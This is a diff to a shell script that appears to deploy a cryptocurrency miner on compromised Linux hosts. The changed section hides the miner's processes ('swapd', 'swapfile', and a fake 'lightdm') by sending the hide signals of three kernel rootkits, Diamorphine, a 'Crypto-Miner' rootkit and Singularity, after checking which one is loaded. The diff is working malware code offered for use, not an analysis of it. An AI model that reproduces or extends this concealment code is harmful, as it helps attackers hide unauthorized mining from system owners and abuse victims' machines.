@@ -2003,16 +2003,41 @@ echo "=========================================="
 echo ""
 
 echo "[*] Hiding processes with rootkit commands..."
+sleep 2  # Ensure services are fully up before sending signals
 
-# Diamorphine (signal 31 = hide, 63 = show)
-kill -31 $(pgrep -f -u root config.json) 2>/dev/null || true
-kill -31 $(ps aux | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+# ---- Diamorphine: signal 31 = hide, signal 63 = unhide ----
+if lsmod | grep -q "^diamorphine" 2>/dev/null; then
+    echo "[*] Diamorphine loaded — sending kill -31 (hide)..."
+    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    echo "[✓] Processes hidden with Diamorphine (kill -31)"
+    echo "[*] To unhide: kill -63 \`/bin/ps ax -fu \$USER | grep swapd | grep -v grep | awk '{print \$2}'\`"
+else
+    echo "[*] Diamorphine not loaded — skipping"
+fi
 
-# Alternative: signal 63 for show (testing)
-# kill -63 $(ps aux | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+# ---- Crypto-Miner rootkit: signal 31 = hide ----
+if lsmod | grep -q "^rootkit" 2>/dev/null; then
+    echo "[*] Crypto-Miner rootkit loaded — sending kill -31 (hide)..."
+    kill -31 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -31 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    echo "[✓] Processes hidden with Crypto-Miner rootkit (kill -31)"
+else
+    echo "[*] Crypto-Miner rootkit not loaded — skipping"
+fi
 
-# Singularity (signal 59 = toggle visibility)
-kill -59 $(ps aux | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null || true
+# ---- Singularity (kernel 6.x): signal 59 = toggle visibility ----
+if [ "$SINGULARITY_LOADED" = true ] || lsmod | grep -q "^singularity" 2>/dev/null; then
+    echo "[*] Singularity loaded — sending kill -59 (toggle hide)..."
+    kill -59 `/bin/ps ax -fu $USER | grep "swapd"   | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "swapfile" | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    kill -59 `/bin/ps ax -fu $USER | grep "lightdm"  | grep -v "grep" | awk '{print $2}'` 2>/dev/null || true
+    echo "[✓] Processes hidden with Singularity (kill -59)"
+else
+    echo "[*] Singularity not loaded — skipping"
+fi
 
 echo "[✓] Process hiding activated"
 echo ""
